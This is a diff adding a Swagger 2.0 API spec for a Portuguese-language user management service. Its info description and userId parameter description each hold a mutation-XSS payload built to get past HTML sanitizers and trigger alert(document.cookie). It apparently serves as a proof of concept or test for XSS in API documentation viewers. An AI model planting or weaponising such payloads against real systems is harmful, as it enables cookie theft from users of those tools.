@@ -1,0 +1,56 @@
+swagger: '2.0'
+info:
+  title: Sistema de Gerenciamento de Usuários
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+  version: 1.0.0
+basePath: /api/v1
+produces:
+  - application/json
+consumes:
+  - application/json
+security:
+  - basicAuth: []
+paths:
+  /users:
+    get:
+      summary: Lista de usuários
+      description: |
+        Endpoint para listar todos os usuários.
+      responses:
+        '200':
+          description: Operação realizada com sucesso
+      tags:
+        - Usuários
+      operationId: listUsers
+  '/users/{userId}':
+    delete:
+      parameters:
+        - description: |
+            <form><math><mtext></form><form><mglyph><svg><mtext><TESTE><path id="</TESTE><img onerror=alert(document.cookie) src=1>"></form>
+          format: int64
+          in: path
+          name: userId
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: Usuário excluído com sucesso
+      tags:
+        - Usuários
+      operationId: deleteUserById
+      summary: Excluir usuário por ID
+definitions:
+  User:
+    properties:
+      id:
+        format: int64
+        type: integer
+      name:
+        type: string
+securityDefinitions:
+  basicAuth:
+    type: basic
+tags:
+  - description: Operações relacionadas a usuários
+    name: Gerenciamento de Usuários
